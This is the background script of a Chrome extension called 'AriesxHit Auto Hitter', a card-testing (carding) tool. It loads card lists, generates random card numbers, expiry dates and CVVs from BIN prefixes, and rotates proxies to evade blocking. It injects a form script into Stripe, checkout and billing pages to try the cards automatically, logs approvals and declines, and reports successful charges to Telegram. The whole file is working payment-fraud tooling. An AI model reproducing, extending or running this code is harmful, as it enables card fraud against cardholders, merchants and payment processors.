// ===================================
// ARIESXHIT BACKGROUND - Auto Hitter
// ===================================

importScripts('tg-config.js');

const state = {
  cardList: [],
  binList: [],
  autoHitActive: false,
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  monitoredTabs: new Set(),
  proxyList: [],
  proxyIndex: 0,
  proxyEnabled: false,
};

// Parse single proxy line. Supports: host:port | host:port:user:pass | user:pass@host:port
function parseProxyLine(line) {
  line = String(line).trim();
  if (!line) return null;
  const at = line.indexOf('@');
  if (at > 0) {
    const auth = line.slice(0, at);
    const hostPort = line.slice(at + 1);
    const hp = hostPort.split(':');
    if (hp.length >= 2) {
      const port = parseInt(hp[hp.length - 1], 10);
      const host = hp.slice(0, -1).join(':').trim();
      const colon = auth.indexOf(':');
      const user = colon >= 0 ? auth.slice(0, colon) : auth;
      const pass = colon >= 0 ? auth.slice(colon + 1) : '';
      return { host, port: isNaN(port) ? 8080 : port, user, pass };
    }
  }
  const parts = line.split(':');
  if (parts.length === 2) {
    const port = parseInt(parts[1], 10);
    return { host: parts[0].trim(), port: isNaN(port) ? 8080 : port };
  }
  if (parts.length >= 4) {
    const host = parts[0].trim();
    const port = parseInt(parts[1], 10);
    const user = parts[2];
    const pass = parts.slice(3).join(':');
    return { host, port: isNaN(port) ? 8080 : port, user, pass };
  }
  return null;
}

// Load proxy list from storage
function loadProxyList() {
  chrome.storage.local.get(['ax_proxy'], (r) => {
    const proxyStr = r.ax_proxy || '';
    state.proxyList = proxyStr.split(/\r?\n/).map(parseProxyLine).filter(Boolean);
    console.log('[Proxy] Loaded proxy list:', state.proxyList.length, 'proxies');
  });
}

// Get next proxy in rotation
function getNextProxy() {
  if (!state.proxyEnabled || !state.proxyList.length) return null;
  const proxy = state.proxyList[state.proxyIndex % state.proxyList.length];
  state.proxyIndex++;
  return proxy;
}

// Update proxy settings for all monitored tabs
function updateProxyForTabs() {
  if (!state.proxyEnabled) return;

  const proxy = getNextProxy();
  if (!proxy) return;

  console.log('[Proxy] Updating proxy for monitored tabs:', proxy);

  // Update proxy for all monitored tabs
  for (const tabId of state.monitoredTabs) {
    try {
      chrome.tabs.sendMessage(tabId, {
        type: 'UPDATE_PROXY',
        proxy: proxy
      }).catch(() => {
        // Tab might not exist anymore
        state.monitoredTabs.delete(tabId);
      });
    } catch (e) {
      console.error('[Proxy] Error updating proxy for tab', tabId, ':', e);
    }
  }
}

// Load BIN list from storage
function loadBinList() {
  chrome.storage.local.get(['savedBins'], (r) => {
    const binStr = r.savedBins || '';
    state.binList = binStr.split(/\r?\n/).map(b => b.trim()).filter(Boolean);
    console.log('[BIN] Loaded BIN list:', state.binList.length, 'bins');
  });
}

// Load card list from storage
function loadCardList() {
  chrome.storage.local.get(['savedCards'], (r) => {
    const cardStr = r.savedCards || '';
    state.cardList = cardStr.split(/\r?\n/).map(c => c.trim()).filter(Boolean);
    console.log('[Cards] Loaded card list:', state.cardList.length, 'cards');
  });
}

// Generate random cards for BIN
function generateCardsForBin(bin, count = 10) {
  const cards = [];
  for (let i = 0; i < count; i++) {
    // Generate random card number (simple Luhn check)
    let cardNum = bin;
    while (cardNum.length < 15) {
      cardNum += Math.floor(Math.random() * 10);
    }

    // Add check digit (simplified)
    const checkDigit = Math.floor(Math.random() * 10);
    cardNum += checkDigit;

    // Random expiry (next 3-5 years)
    const year = new Date().getFullYear() + Math.floor(Math.random() * 3) + 1;
    const month = Math.floor(Math.random() * 12) + 1;

    // Random CVV
    const cvv = Math.floor(Math.random() * 900) + 100;

    cards.push(`${cardNum}|${month.toString().padStart(2, '0')}|${year.toString().slice(-2)}|${cvv}`);
  }
  return cards;
}

// Generate cards for all bins
function generateAllCards() {
  if (!state.binList.length) return;

  const allCards = [];
  for (const bin of state.binList) {
    const cards = generateCardsForBin(bin);
    allCards.push(...cards);
  }

  state.cardList = allCards;
  console.log('[Cards] Generated', allCards.length, 'cards from', state.binList.length, 'bins');

  // Save to storage
  chrome.storage.local.set({
    savedCards: allCards.join('\n')
  });

  // Notify all tabs
  sendStateUpdate();
}

// Update proxy settings
function updateProxySettings() {
  chrome.storage.local.get(['ax_proxy_enabled'], (r) => {
    state.proxyEnabled = r.ax_proxy_enabled === true;
    console.log('[Proxy] Proxy enabled:', state.proxyEnabled);

    if (state.proxyEnabled) {
      loadProxyList();
      updateProxyForTabs();
    }
  });
}

// Send state update to all monitored tabs
function sendStateUpdate() {
  const update = {
    autoHitActive: state.autoHitActive,
    cardList: state.cardList,
    binList: state.binList,
    proxyEnabled: state.proxyEnabled,
    resetAttempts: true
  };

  for (const tabId of state.monitoredTabs) {
    try {
      chrome.tabs.sendMessage(tabId, {
        type: 'STATE_UPDATE',
        ...update
      }).catch(() => {
        // Tab might not exist anymore
        state.monitoredTabs.delete(tabId);
      });
    } catch (e) {
      console.error('[State] Error sending update to tab', tabId, ':', e);
    }
  }
}

// Send logs to popup/dashboard
function sendLogsUpdate() {
  // Send to popup
  chrome.runtime.sendMessage({
    type: 'LOGS_UPDATE',
    logs: state.logs.slice(-100) // Last 100 logs
  }).catch(() => {});

  // Send to all monitored tabs (for dashboard)
  for (const tabId of state.monitoredTabs) {
    try {
      chrome.tabs.sendMessage(tabId, {
        type: 'LOGS_UPDATE',
        logs: state.logs.slice(-100)
      }).catch(() => {
        // Tab might not exist anymore
        state.monitoredTabs.delete(tabId);
      });
    } catch (e) {
      console.error('[Logs] Error sending logs to tab', tabId, ':', e);
    }
  }
}

// Handle messages from content scripts
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  const { type } = msg;

  // Handle tab monitoring
  if (sender.tab?.id) {
    state.monitoredTabs.add(sender.tab.id);
  }

  switch (type) {
    case 'GET_STATE': {
      sendResponse({
        autoHitActive: state.autoHitActive,
        cardList: state.cardList,
        binList: state.binList,
        proxyEnabled: state.proxyEnabled
      });
      break;
    }

    case 'CARD_TRYING': {
      const entry = {
        type: 'log',
        subtype: 'trying',
        message: 'Trying Card: ' + (msg.card || ''),
        card: msg.card,
        timestamp: Date.now()
      };
      state.logs.push(entry);
      sendLogsUpdate();
      break;
    }

    case 'CARD_HIT': {
      state.stats.hits++;
      const entry = {
        type: 'log',
        subtype: 'hit',
        message: 'Success: Payment completed successfully!',
        card: msg.card,
        timestamp: Date.now()
      };
      state.logs.push(entry);
      sendLogsUpdate();

      // Save hit info
      chrome.storage.local.set({
        ax_last_hit: new Date().toLocaleString(),
        ax_last_hit_card: msg.card
      });

      // Send Telegram notification
      sendTelegramHit(msg.card, msg.amount);
      break;
    }

    case 'CARD_ERROR': {
      state.stats.declined++;
      const entry = {
        type: 'log',
        subtype: 'error',
        message: 'Decline: ' + (msg.message || msg.code || 'unknown'),
        code: msg.code,
        decline_code: msg.decline_code,
        card: msg.card,
        timestamp: Date.now()
      };
      state.logs.push(entry);
      sendLogsUpdate();
      break;
    }

    case 'GET_LOGS': {
      sendResponse(state.logs.slice(-100));
      break;
    }

    case 'GET_STATS': {
      sendResponse(state.stats);
      break;
    }

    case 'CLEAR_LOGS': {
      state.logs = [];
      state.stats = { hits: 0, tested: 0, declined: 0 };
      sendLogsUpdate();
      break;
    }

    case 'START_AUTO_HIT': {
      state.autoHitActive = true;
      loadCardList();
      loadBinList();
      updateProxySettings();
      sendStateUpdate();

      // Generate cards if we have bins but no cards
      if (state.binList.length && !state.cardList.length) {
        generateAllCards();
      }
      break;
    }

    case 'STOP_AUTO_HIT': {
      state.autoHitActive = false;
      sendStateUpdate();
      break;
    }

    case 'GENERATE_CARDS': {
      generateAllCards();
      break;
    }

    case 'UPDATE_PROXY': {
      updateProxySettings();
      break;
    }
  }
});

// Monitor tab updates to inject scripts
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    // Check if this is a Stripe page
    const url = tab.url.toLowerCase();
    if (url.includes('stripe.com') || url.includes('checkout') || url.includes('billing')) {
      // Inject our scripts
      chrome.scripting.executeScript({
        target: { tabId },
        files: ['scripts/autohitter/form-injector.js']
      }).catch(e => console.error('[Injection] Failed to inject form-injector:', e));
    }
  }
});

// Handle tab removal
chrome.tabs.onRemoved.addListener((tabId) => {
  state.monitoredTabs.delete(tabId);
});

// Initialize on install
chrome.runtime.onInstalled.addListener(() => {
  console.log('[AriesxHit] Extension installed/reloaded');
  loadCardList();
  loadBinList();
  loadProxyList();
  updateProxySettings();
});

// Initialize
loadCardList();
loadBinList();
loadProxyList();
updateProxySettings();